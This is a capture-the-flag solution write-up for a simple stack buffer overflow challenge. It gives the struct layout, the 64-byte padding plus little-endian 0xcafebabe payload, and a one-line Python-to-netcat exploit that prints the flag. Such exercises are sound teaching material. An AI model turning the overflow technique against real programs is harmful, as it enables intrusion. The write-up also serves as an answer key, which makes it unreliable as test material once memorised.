# Direct TCP Overflow - Solution Writeup

## Challenge Overview
This challenge uses `redirect_type: direct` with `redirect_port: 1337` in CTFd Whale.
Players connect directly to the service using Netcat or TCP sockets:
```bash
nc <host> <port>
```

## Vulnerability
The C binary `chall` defines:
```c
struct {
    char buffer[64];
    volatile int target;
} ctx;
```
`ctx.target` is initialized to `0x11223344`.
Inputting 64 bytes into `buffer` followed by `\xbe\xba\xfe\xca` (0xcafebabe in little-endian format) overwrites `ctx.target` to `0xcafebabe`, triggering `win()` and outputting `/flag.txt`.

## How to Solve
1. Connect via Netcat:
   ```bash
   python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xbe\xba\xfe\xca\n")' | nc localhost 1337
   ```
2. Or run the automated Python solver:
   ```bash
   python3 solve.py <host> <port>
   ```
